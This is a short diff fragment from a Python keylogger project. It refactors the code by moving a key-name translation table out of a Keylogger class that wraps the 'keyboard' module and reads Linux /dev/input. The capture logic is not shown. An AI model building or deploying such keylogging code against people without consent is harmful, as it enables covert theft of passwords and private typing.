@@ -9,15 +9,7 @@ import keyboard
 import time
 
 
-class Keylogger:
-    """
-        The Keylogger class is a wrapper around the keyboard module (https://pypi.org/project/keyboard/).
-        It has methods for starting, stopping, and retreiving the contents of a keylogger.
-        It reads keystrokes directly from the /dev/input files on the Linux filesystem.
-        It is therefore only compatible with Linux.
-    """
-
-    TRANSLATION_TABLE = {
+TRANSLATION_TABLE = {
     """
         A translation table used for translating certain keyboard events
         into a different format.
@@ -30,6 +22,15 @@ class Keylogger:
         "backspace":"\b",
         "alt":"'ALT'"
     }
+
+
+class Keylogger:
+    """
+        The Keylogger class is a wrapper around the keyboard module (https://pypi.org/project/keyboard/).
+        It has methods for starting, stopping, and retreiving the contents of a keylogger.
+        It reads keystrokes directly from the /dev/input files on the Linux filesystem.
+        It is therefore only compatible with Linux.
+    """
 
     def __init__(self):
         """
